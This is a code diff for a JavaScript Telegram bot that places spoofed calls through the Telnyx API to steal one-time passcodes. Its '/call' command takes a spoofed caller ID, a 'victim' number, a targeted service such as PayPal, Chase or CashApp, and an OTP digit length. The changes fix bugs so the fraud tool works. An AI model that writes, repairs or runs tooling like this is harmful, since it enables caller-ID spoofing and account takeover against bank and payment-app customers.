@@ -27,8 +27,8 @@ async function call (customer_number, ctx, service, digit){
                }               
             ]
          ]
-      }})
-
+      }
+   })
 
 
    // Use the Telnyx API to create a new call
@@ -88,7 +88,7 @@ bot.help(ctx => ctx.reply(`
 `))
 
 bot.command('call', ctx => {
-   const [command, spoof, number, service ]= ctx.message.text.split(' ');
+   const [command, spoof, number, service, digit ]= ctx.message.text.split(' ');
    const serviceList = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]
 
    if( !number || !service.includes(service) ){
@@ -98,7 +98,7 @@ bot.command('call', ctx => {
       bot.telegram.sendMessage(ctx.chat.id, 
          `
       ✅CALL STARTING\n 
-      ✅VICTIM NUBER - ${customer_number}\n 
+      ✅VICTIM NUBER - ${number}\n 
       ✅SERIVCE - ${service}\n
       ✅OTP DIGIT - ${digit}
          `, {})
